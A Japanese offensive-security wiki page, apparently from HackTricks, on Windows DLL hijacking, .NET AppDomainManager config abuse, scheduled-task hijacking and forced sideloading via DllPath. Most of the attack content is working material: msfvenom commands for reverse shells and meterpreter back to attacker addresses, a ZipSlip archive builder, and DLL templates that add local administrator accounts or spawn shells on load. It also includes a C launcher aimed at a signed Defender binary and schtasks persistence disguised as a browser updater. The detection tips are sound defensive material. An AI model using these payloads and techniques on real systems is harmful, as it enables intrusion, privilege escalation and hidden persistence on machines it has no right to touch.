# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本情報

DLL Hijacking は、信頼されたアプリケーションに悪意のある DLL を読み込ませる手法です。この用語には、**DLL Spoofing、Injection、Side-Loading** など、いくつかの手法が含まれます。主にコード実行や永続化の実現に利用され、権限昇格に使われることは比較的まれです。ここでは権限昇格に焦点を当てていますが、目的が異なっても hijacking の手法自体は変わりません。

### 一般的な手法

DLL Hijacking にはいくつかの手法があり、それぞれの有効性はアプリケーションの DLL 読み込み方法によって異なります:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: 正規の DLL を悪意のある DLL に置き換える手法です。DLL Proxying を使用して、元の DLL の機能を維持することもできます。
2. **DLL Search Order Hijacking**: 正規の DLL より先に検索されるパスに悪意のある DLL を配置し、アプリケーションの検索順序を悪用する手法です。
3. **Phantom DLL Hijacking**: 存在しない必須 DLL だとアプリケーションに思わせて読み込ませるため、悪意のある DLL を作成する手法です。
4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` ファイルなどの検索パラメーターを変更し、アプリケーションが悪意のある DLL を読み込むよう誘導する手法です。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内の正規 DLL を悪意のある DLL に置き換える手法です。DLL side-loading と関連付けられることがよくあります。
6. **Relative Path DLL Hijacking**: コピーしたアプリケーションとともに、ユーザーが制御できるディレクトリに悪意のある DLL を配置する手法です。Binary Proxy Execution の手法に似ています。

アプリケーションが**独自の DLL loader**を実装している場合もあります。特権プロセスが `Libraries` や `Plugins` などの子ディレクトリを列挙し、選択した DLL をヘルパーに渡すことがあります。この処理は、通常の Windows DLL 検索順序とは独立しています。別のアカウントがそのディレクトリにファイルを作成できる場合は、調査の手がかりとして扱ってください。プロセスの実行ユーザー、ディレクトリに適用される ACL、ファイルの選択ルール、そして DLL の読み込み処理に到達できるかを確認してください。実行ファイルの隣にあるディレクトリが書き込み可能でも、そのプロセスがそこから DLL を読み込むことの証明にはなりません。

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

従来の DLL sideloading だけが、信頼された **.NET Framework** プロセスに攻撃者のコードを読み込ませる方法ではありません。対象の実行ファイルが**マネージド**アプリケーションである場合、CLR は実行ファイル名に基づく**アプリケーション構成ファイル**（例: `Setup.exe.config`）も参照します。このファイルでは、カスタム **AppDomainManager** を定義できます。構成ファイルが EXE の隣に配置された攻撃者の制御下にあるアセンブリを指定している場合、CLR は**アプリケーションの通常のコードパスより前に**それを読み込み、信頼されたプロセス内で実行します。<sup>[[24]](#references)</sup>

Microsoft の .NET Framework 構成スキーマによると、カスタム manager を使用するには `<appDomainManagerAssembly>` と `<appDomainManagerType>` の両方が必要です。<sup>[[16]](#references)[[17]](#references)</sup>

最小構成の設定例:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

最小限のマネージャー:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

実践的な注意点:
- これは **.NET Framework 固有**の tradecraft です。Win32 DLL の検索順序ではなく、CLR の config 解析に依存します。
- ホストは実際に **managed EXE** である必要があります。簡単なトリアージ方法: `sigcheck -m target.exe`、`corflags target.exe` を実行するか、PE metadata 内の **CLR Runtime Header** を確認します。
- config のファイル名は実行ファイル名と完全に一致し（`<binary>.config`）、通常は **EXE と同じ場所**にあります。
- **署名済みの Microsoft/vendor バイナリ**で有効な手法です。信頼された EXE を変更せずに、悪意のある managed assembly をプロセス内で実行できます。
- 書き込み可能なインストーラー/アップデート用ディレクトリがすでにある場合、AppDomainManager hijacking を **第1段階**として使い、その後の段階で従来型の DLL sideloading や reflective loading を実行できます。

### ダウンローダー + scheduled-task bootstrap としての AppDomainManager

実用的な侵入パターンとして、信頼された managed EXE と、**小さな bootstrapper**としてのみ動作する悪意のある `*.config` および悪意のある AppDomainManager DLL を組み合わせます:<sup>[[25]](#references)</sup>

1. ユーザーが `%USERPROFILE%\Downloads` などのもっともらしい場所から、署名済みの .NET インストーラーまたはアップデーターを起動します。
2. 隣接する config により、正規アプリのロジックが開始する**前に** CLR が攻撃者の assembly を読み込みます。
3. 悪意のある manager が **path gate** を実行します（たとえば、ホスト EXE が `Downloads` から実行されている場合にのみ続行し、第2段階は `%LOCALAPPDATA%` から実行する場合に限ります）。
4. チェックに合格すると、ユーザーが書き込み可能な `%LOCALAPPDATA%\PerfWatson2.exe` などのパスに実際の payload をダウンロードし、scheduled task を使って永続化します。

この亜種が重要な理由:
- 署名済みホスト EXE は変更されないため、メインバイナリの hash だけを確認するトリアージでは侵害を見逃す可能性があります。
- 単純な **path-based anti-analysis** はよく使われます。ZIP/EXE/DLL の3点セットを Desktop、Temp、または sandbox のパスに移動すると、意図的に処理が中断されることがあります。
- 第1段階の AppDomainManager DLL は小さく目立たないままにし、実際の implant は後から取得できます。

このパターンでよく見られる、最小限の永続化の例:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notes:
- ` /rl highest` は、そのユーザー/セッションで**利用可能な最高レベル**を意味します。それだけでSYSTEMへの昇格が保証されるわけではありません。
- この手法は、古典的なDLL検索順序の欠落を利用したhijackingというより、**.NET configの悪用による実行/persistence**として分類するほうが適切な場合が多いですが、攻撃者は両方を頻繁に組み合わせます。

検出の着眼点:
- **ZIPの展開先**、`Downloads`、`%TEMP%`、その他のユーザーが書き込み可能なフォルダーから起動された、署名済み.NET実行ファイルと、同じ場所にある`<exe>.config`。
- アクションが`%LOCALAPPDATA%`、`%APPDATA%`、または`Downloads`内を指し、名前がブラウザー/ベンダーのupdaterを装っている新しいscheduled task。
- 別のEXEを直ちにダウンロードし、その後`schtasks.exe`を起動する、短時間だけ動作するmanaged bootstrapプロセス。
- 実行ファイルのパスが想定されたユーザープロファイルのディレクトリと一致しない場合、早期終了するサンプル。

### 既存のscheduled taskをhijackしてsideload chainを再起動する

persistenceでは、**新しいtaskの作成**だけを探してはいけません。一部の侵入グループは、正規のインストーラーが**通常のupdater task**を作成するのを待ち、その後、既存の名前、作成者、トリガーを防御側に見慣れた状態のまま、**task actionを書き換えます**。

再利用可能なワークフロー:
1. 正規のソフトウェアをインストール/実行し、通常作成されるtaskを特定します。
2. task XMLをエクスポートし、現在の`<Exec><Command>` / `<Arguments>`の値を記録します。<sup>[[23]](#references)</sup>
3. actionだけを置き換え、ユーザーが書き込み可能なステージングディレクトリにある**信頼できるhost EXE**をtaskで起動します。このEXEが、実際のpayloadをside-loadするかAppDomain-loadします。
4. 目立つ新しいpersistence artifactを作成する代わりに、同じtask名で再登録します。

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

なぜより stealthy なのか:
- task 名は、vendor updater などの正規のものに見せかけられます。
- **Task Scheduler service** が起動するため、親プロセスや祖先プロセスの検証では、`explorer.exe` ではなく想定どおりのスケジューリングチェーンが確認されることがよくあります。
- **新しい task 名** だけを調査する DFIR チームは、登録自体は以前から存在していても、action の参照先が `%LOCALAPPDATA%`、`%APPDATA%`、または攻撃者が制御できる別のパスに変更された task を見落とす可能性があります。

素早く調査するためのポイント:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` の XML と `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` の metadata をベースラインと比較します。
- **vendor の updater に見える task** が **ユーザーが書き込み可能なディレクトリ** から実行される場合、または同じディレクトリにある `*.config` ファイルとともに .NET EXE を起動する場合に alert を出します。

> [!TIP]
> HTML staging、AES-CTR configs、.NET implants を DLL sideloading に重ねる手順を追った chain については、以下の workflow を参照してください。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## DLL の欠落を見つける

システム内で欠落している DLL を見つける最も一般的な方法は、Sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、**次の 2 つの filter を設定する**ことです。

![一般的な手法 - 欠落している DLL を見つける: システム内で欠落している DLL を見つける最も一般的な方法は、Sysinternals の procmon を実行し、次の 2 つの filter を設定することです](<../../../images/image (961).png>)

![一般的な手法 - 欠落している DLL を見つける: システム内で欠落している DLL を見つける最も一般的な方法は、Sysinternals の procmon を実行し、次の 2 つの filter を設定することです](<../../../images/image (230).png>)

そして、**File System Activity** のみを表示します。

![一般的な手法 - 欠落している DLL を見つける: File System Activity のみを表示します](<../../../images/image (153).png>)

**一般的な欠落 DLL** を探している場合は、**数秒間** 実行したままにします。\
**特定の実行ファイル内で欠落している DLL** を探している場合は、**"Process Name" "contains" `<exec name>`** のような別の filter を設定して実行し、イベントのキャプチャを停止します。<sup>[[9]](#references)</sup>

## 欠落 DLL の悪用

privileges を昇格させるには、privileged process が書き込み可能な場所から読み込もうとする **DLL** を探します。正規の DLL があるディレクトリよりも先に検索されるディレクトリを制御できる場合や、要求された DLL が存在せず、検索対象ディレクトリのいずれかに書き込める場合に、この状況が発生します。

### DLL の検索順序

[**Microsoft のドキュメント**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **では、DLL がどのように読み込まれるかを確認できます。**

**Windows applications** は、**あらかじめ定義された検索パス** を特定の順序でたどって DLL を探します。DLL hijacking は、悪意のある DLL をこれらのディレクトリのいずれかに戦略的に配置し、正規の DLL より先に読み込ませることで発生します。これを防ぐには、必要な DLL を参照する際に application が絶対パスを使うようにします。

以下に **32-bit** システムでの **DLL の検索順序** を示します。

1. application が読み込まれたディレクトリ。
2. system directory。このディレクトリのパスを取得するには、[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function を使います。(_C:\Windows\System32_)
3. 16-bit system directory。このディレクトリのパスを取得する function はありませんが、検索対象になります。(_C:\Windows\System_)
4. Windows directory。このディレクトリのパスを取得するには、[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function を使います。
   1. (_C:\Windows_)
5. current directory。
6. PATH environment variable に含まれるディレクトリ。**App Paths** registry key で指定された application ごとのパスは含まれないことに注意してください。DLL の検索パスを計算する際に **App Paths** key は使われません。

これは **SafeDllSearchMode** が有効な場合の **既定の** 検索順序です。無効にすると、current directory は 2 番目に繰り上がります。この機能を無効にするには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value を作成し、0 に設定します（既定では有効です）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function が **LOAD_WITH_ALTERED_SEARCH_PATH** を指定して呼び出された場合、検索は **LoadLibraryEx** が読み込む executable module のディレクトリから始まります。

最後に、DLL は名前ではなく絶対パスで読み込むこともできます。この場合、Windows は DLL 自体についてはそのパスのみを検索します。名前で要求された dependencies は、引き続き該当する検索順序に従います。

検索順序を変更する方法はほかにもありますが、ここでは説明しません。

### 任意ファイル書き込みから欠落 DLL hijack への連鎖

**関連する手法:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. **ProcMon** filters（`Process Name` = 対象 EXE、`Path` ends with `.dll`、`Result` = `NAME NOT FOUND`）を使って、process が probe したものの見つからなかった DLL 名を収集します。<sup>[[14]](#references)</sup>
2. binary が **schedule/service** で実行される場合、該当する名前の DLL を **application directory**（検索順序の項目 #1）に配置すると、次回の実行時に読み込まれます。ある .NET scanner のケースでは、process は本物の `hostfxr.dll` を `C:\Program Files\dotnet\fxr\...` から読み込む前に、`C:\samples\app\` で `hostfxr.dll` を探していました。
3. 任意の export を持つ payload DLL（例: reverse shell）を作成します: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`。
4. primitive が **ZipSlip-style の任意書き込み** の場合は、展開先ディレクトリから抜け出して DLL が app folder に配置される ZIP を作成します:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. アーカイブを監視対象の inbox/share に配置します。スケジュールされたタスクがプロセスを再起動すると、悪意のある DLL が読み込まれ、サービスアカウントとしてコードが実行されます。

### RTL_USER_PROCESS_PARAMETERS.DllPath を介して sideloading を強制する

新しく作成するプロセスの DLL 検索パスに確実に影響を与える高度な方法は、ntdll のネイティブ API を使用してプロセスを作成する際に、RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定することです。攻撃者が制御するディレクトリを指定すると、名前でインポート DLL を解決する（絶対パスを使用せず、安全な読み込みフラグも使用しない）対象プロセスに、そのディレクトリから悪意のある DLL を読み込ませることができます。

Key idea
- RtlCreateProcessParametersEx でプロセスパラメーターを構築し、制御下のフォルダー（例: dropper/unpacker があるディレクトリ）を指すカスタム DllPath を指定します。
- RtlCreateUserProcess でプロセスを作成します。対象バイナリが DLL を名前で解決すると、ローダーは解決時に指定された DllPath を参照するため、悪意のある DLL を対象 EXE と同じ場所に置かなくても、確実に sideloading できます。

Notes/limitations
- これは作成される子プロセスに影響します。現在のプロセスだけに影響する SetDllDirectory とは異なります。
- 対象は、DLL を名前でインポートするか LoadLibrary する必要があります（絶対パスを使わず、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories も使用しないこと）。
- KnownDLLs とハードコードされた絶対パスは hijack できません。転送された export や SxS によって優先順位が変わる場合があります。

最小限の C の例（ntdll、ワイド文字列、簡略化したエラー処理）:

<details>
<summary>完全な C の例: RTL_USER_PROCESS_PARAMETERS.DllPath を介して DLL sideloading を強制する</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

運用上の使用例
- 悪意のある xmllite.dll（必要な関数をエクスポートするか、実際の DLL にプロキシするもの）を、DllPath ディレクトリに配置します。
- 上記の手法を使って xmllite.dll を名前で検索することが知られている、署名済みバイナリを起動します。ローダーは指定された DllPath 経由でインポートを解決し、DLL を sideload します。

この手法は、実環境で複数段階の sideloading チェーンを実行する目的で確認されています。最初のランチャーがヘルパー DLL をドロップし、その DLL が、カスタム DllPath を指定して Microsoft 署名済みの hijack 可能なバイナリを起動し、ステージングディレクトリから攻撃者の DLL を強制的に読み込ませます。<sup>[[6]](#references)</sup>


### `.exe.config` を介した .NET AppDomainManager hijacking

**.NET Framework** のターゲットでは、アプリケーションに隣接する **`.exe.config`** ファイルを悪用することで、メモリをパッチせずに **`Main()` の実行前**に sideloading を行えます。攻撃者は Win32 DLL の検索順序だけに頼るのではなく、正規の .NET EXE を悪意のある config ファイルおよび攻撃者が制御する 1 つ以上のアセンブリと一緒に配置します。

このチェーンの仕組み:<sup>[[15]](#references)[[22]](#references)</sup>
1. ホスト EXE が起動し、**CLR が `<exe>.config` を読み込みます**。
2. config で **`<appDomainManagerAssembly>`** と **`<appDomainManagerType>`** を設定し、ランタイムに攻撃者が制御する `AppDomainManager` をインスタンス化させます。
3. 悪意のあるマネージャーが、信頼されたホストプロセス内で **`Main()` 実行前にコードを実行します**。
4. 同じ config で、CLR にローカルアセンブリ（例: `InitInstall.dll`、`Updater.dll`、`uevmonitor.dll`）を優先的に解決させることができ、インラインパッチを使わずにランタイムの検証やテレメトリを弱めることもできます。

キャンペーンで見られるパターン（ディレクティブや CLR のバージョンによって、正確な入れ子構造は異なる場合があります）:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

有用な理由:
- **`<probing privatePath="."/>`** は assembly の解決先をアプリケーションディレクトリ内に保ち、そのフォルダーを予測可能な sideloading の攻撃対象にします。<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** は、正規のアプリロジックが実行される前の CLR 初期化中に、実行を攻撃者のコードへ移します。<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** により、full-trust アプリは strong-name 検証エラーを起こさず、署名されていない assembly や改ざんされた assembly を読み込める場合があります。<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** は、新しい assembly への publisher-policy によるリダイレクトを回避します。<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** は、runtime の選択をより予測可能にします。<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** は特に興味深い設定です。implant がメモリ上で `EtwEventWrite` を patch するのではなく、設定によって **CLR 自身の ETW 可視性を無効化**します。

最近のキャンペーンで見られる運用パターン:
- ステージ 1 では、`setup.exe`、`setup.exe.config`、およびローカル assembly を配置します。
- ステージ 2 では、それらを実在しそうな **AppData の update** フォルダーにコピーし、ホスト名を `update.exe` のような名前に変更して、**scheduled task** から再起動します。
- ステージ 3 では、最終的な RAT DLL/export を読み込む前に、実行コンテキスト（例: Task Scheduler からの想定される親プロセス `svchost.exe`）を確認します。

調査のヒント:
- ユーザーが書き込み可能な場所で、不審な隣接 **`.config`** ファイルとともに実行されている、署名済みまたはその他の正規の **.NET 実行ファイル**。
- **`appDomainManagerAssembly`**、**`appDomainManagerType`**、**`probing privatePath="."`**、**`bypassTrustedAppStrongNames`**、または **`etwEnable enabled="false"`** を含む `.config` ファイル。
- **`%LOCALAPPDATA%`** またはアプリ固有の `\bin\update\` ディレクトリから、名前を変更した update バイナリを再起動する scheduled task。
- scheduled task が信頼された .NET ホストを起動し、そのホストが直ちに自身のディレクトリからベンダー製でない assembly を読み込む親子プロセスの連鎖。

#### Windows docs に記載された DLL search order の例外

Windows のドキュメントには、標準の DLL search order に対する特定の例外が記載されています。

- **メモリにすでに読み込まれている DLL と同じ名前の DLL** が見つかった場合、システムは通常の検索を省略します。代わりにリダイレクトとマニフェストを確認し、その後、メモリ内にある DLL を使用します。**この場合、システムは DLL を検索しません**。
- DLL が現在の Windows バージョンの **known DLL** として認識される場合、システムは検索を行わず、その known DLL のバージョンと依存 DLL を使用します。これらの known DLL の一覧は、レジストリキー **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** にあります。
- **DLL に依存関係がある**場合、それらの依存 DLL は、最初の DLL がフルパスで指定されていたかどうかにかかわらず、**モジュール名のみで指定された**ものとして検索されます。

### 権限昇格

**要件**:

- **異なる権限**（水平移動または横展開）で動作する、または動作する予定の、**DLL が不足している**プロセスを特定する。
- **DLL** の検索対象となる**ディレクトリ**に、書き込みアクセスがあることを確認する。この場所は、実行ファイルのディレクトリまたはシステムパス内のディレクトリの場合があります。

これらの前提条件がデフォルトで揃うことはまれです。権限の高い実行ファイルに DLL の依存関係が欠けていることは通常なく、標準ユーザーは通常、システムの検索パス内のディレクトリに書き込めません。ただし、設定ミスのある環境では両方の条件が揃うことがあります。\
要件を満たしている場合は、[UACME](https://github.com/hfiref0x/UACME) プロジェクトを確認してください。主な目的は UAC bypass ですが、特定の Windows バージョン向けの DLL-hijacking PoC が含まれており、見つかった書き込み可能なディレクトリに合わせて応用できることがよくあります。

次のコマンドで、**フォルダーへのアクセス権を確認**できます。<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

また、**PATH 内のすべてのフォルダーのアクセス権を確認してください**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

また、次の方法で実行ファイルのインポートと dll のエクスポートも確認できます。

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

DLL Hijacking を悪用して、**System Path フォルダーへの書き込み権限を使って権限昇格する方法**の完全なガイドは、こちらを確認してください:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自動化ツール

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、system PATH 内の任意のフォルダーに書き込み権限があるかを確認します。\
この脆弱性の発見に役立つその他の自動化ツールは、**PowerSploit functions**の _Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_ です。

### 例

悪用可能な状況を見つけた場合、悪用を成功させるために特に重要なのは、**実行ファイルがその DLL からインポートするすべての関数をエクスポートする DLL を作成すること**です。なお、DLL Hijacking は、[Medium Integrity level から High への権限昇格 **（UAC のバイパス）**](../../authentication-credentials-uac-and-efs/index.html#uac)や、[**High Integrity から SYSTEM への権限昇格**](../index.html#from-high-integrity-to-system)**.**にも便利です。実行を目的とした DLL hijacking に焦点を当てたこの調査記事で、**有効な DLL の作成方法**の例を確認できます: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
さらに、**次のセクション**には、**テンプレート**として、または不要な関数をエクスポートする **DLL** の作成に役立つ**基本的な DLL コード**があります。

## **DLL の作成とコンパイル**

### **DLL Proxifying**

基本的に、**DLL proxy** は、**ロード時に悪意のあるコードを実行**できるだけでなく、**実際のライブラリにすべての呼び出しを中継することで**、**想定どおりに動作し、公開する** DLL です。

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) または [**Spartacus**](https://github.com/Accenture/Spartacus) を使えば、実行ファイルを指定して proxify するライブラリを選択し、**proxified dll を生成**できます。または、DLL を指定して **proxified dll を生成**できます。

### **Meterpreter**

**rev shell を取得（x64）:**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**meterpreter (x86) を取得する:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**ユーザーを作成する（x86。x64版は見つけられませんでした）:**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### 自作

多くの場合、コンパイルするDLLは、**被害プロセスがインポートするすべての関数をexportする**必要があります。必要なexportが欠けていると、バイナリはその関数を解決できず、exploitは失敗します。

<details>
<summary>C DLLテンプレート (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>ユーザー作成機能付きC++ DLLの例</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>スレッドエントリを備えた別の C DLL</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## ケーススタディ: Narrator OneCore TTS Localization DLL Hijack（アクセシビリティ/ATs）

Windows Narrator.exe は起動時に、予測可能な言語固有の localization DLL を引き続き探します。この DLL を hijack すると、任意のコード実行や永続化が可能です。<sup>[[7]](#references)</sup>

主な事実
- プローブパス（現行ビルド）: `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US)。
- 旧パス（古いビルド）: `%windir%\System32\speech\engine\tts\msttslocenus.dll`。
- 書き込み可能な攻撃者管理下の DLL が OneCore パスに存在する場合、ロードされ、`DllMain(DLL_PROCESS_ATTACH)` が実行されます。エクスポートは不要です。

Procmon による検出
- フィルター: `Process Name is Narrator.exe` および `Operation is Load Image` または `CreateFile`。
- Narrator を起動し、上記パスへのロード試行を確認します。

最小限の DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC上の静音化
- 単純な hijack では、音声が出たり UI が強調表示されたりします。静かに実行するには、attach 時に Narrator のスレッドを列挙し、メインスレッドを開いて（`OpenThread(THREAD_SUSPEND_RESUME)`）、`SuspendThread` で一時停止します。処理は自身のスレッドで続行してください。全コードについては PoC を参照してください。<sup>[[8]](#references)</sup>

